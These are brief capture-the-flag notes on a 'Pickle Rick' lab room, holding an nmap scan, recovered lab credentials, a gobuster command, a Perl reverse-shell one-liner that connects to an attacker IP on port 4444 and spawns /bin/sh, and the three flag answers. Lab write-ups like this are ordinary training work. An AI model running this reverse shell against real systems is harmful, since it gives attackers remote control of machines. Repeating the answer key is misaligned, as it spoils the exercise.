# Pickle Rick 

> David

------------------

10.10.253.0

nmap -sV -sC 10.10.253.0 -o nmap/initial
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 18:16 EDT
Nmap scan report for 10.10.253.0
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:51:4a:2b:cf:8f:fe:36:d1:4b:44:ab:47:9c:cc:e8 (RSA)
|   256 e2:32:51:4b:38:58:3a:98:19:70:e5:d3:73:64:43:b2 (ECDSA)
|_  256 3c:9f:e7:4b:53:64:fb:90:5d:44:b5:d5:88:b2:24:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds
```

# Open Ports: 22, 80

> Creds
```
Username: R1ckRul3s
Password: Wubbalubbadubdub

```

# Gobuster

>gobuster dir -u http://10.10.253.0/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

```
perl -e 'use Socket;$i="10.18.88.178";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# 1st Ingredient 
```
mr. meeseek hair
```

# 2nd Ingredient 
```
1 jerry tear
```

# 3rd Ingredient
```
fleeb juice
```